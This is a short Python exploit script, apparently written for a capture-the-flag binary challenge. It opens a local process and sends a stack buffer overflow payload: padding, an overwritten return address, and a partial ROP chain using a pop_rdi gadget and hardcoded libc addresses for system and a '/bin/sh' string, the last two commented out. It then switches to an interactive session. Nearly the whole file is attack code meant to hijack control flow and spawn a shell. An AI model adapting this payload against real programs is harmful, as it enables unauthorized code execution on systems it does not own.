import interact
import struct

# Pack integer 'n' into a 8-Byte representation
def p64(n):
    return struct.pack('Q', n)

# Unpack 8-Byte-long string 's' into a Python integer
def u64(s):
    return struct.unpack('Q', s)[0]

p = interact.Process()
print(p.readuntil('guess:'))

buffer_start = 0x7fffffffed40 # rbp-0x40
libc_base = 0x7f000042c000
pop_rdi = p64(0x0000000000400e93)
add_rsp_0x8 = p64(0x0000000000400722)
system = p64(0x7f0000471390)
sh = p64(0x7f00005b8d57)

payload = "rop chain" + "\0"*11 + "A"*52 + "\x22\x07\x40\x00" + "rop chain" + "\0"*7 + pop_rdi #+ sh + system

p.sendline(payload)

p.interactive() 

# 0x7fffffffed90 -> secret
